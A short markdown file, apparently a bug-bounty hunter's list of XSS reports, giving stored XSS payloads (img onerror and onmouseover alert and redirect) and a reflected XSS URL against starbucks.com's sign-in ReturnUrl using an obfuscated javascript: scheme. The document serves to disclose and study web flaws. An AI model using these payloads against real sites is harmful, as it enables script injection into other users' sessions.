# XSS Reports 
## stored xss
 payload: ```"><img src=x onerror=alert(document.domain)>```
![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/b1a860c0-abd6-4a98-949e-dd723f4488aa)

## stored xss
payload : 

```<input><img src=a onmouseover=window.location.href='https://www.test.com'>```

```<img src=x onmouseover=alert('XSS-Stored')>``` 

![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/fafd92e1-16f9-45d7-9a9b-946612ebb044)


## Reflected Cross site Scripting (XSS) on www.starbucks.com
url :  https://www.starbucks.com/account/signin?ReturnUrl=%19Jav%09asc%09ript%3ahttps%20%3a%2f%2fwww%2estarbucks%2ecom%2f%250Aalert%2528document.domain%2529

payload : ```Javascript:https://www.starbucks.com/alert(document.domain)```

![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/b9685bba-070b-4d24-8910-20bf91d122d2)

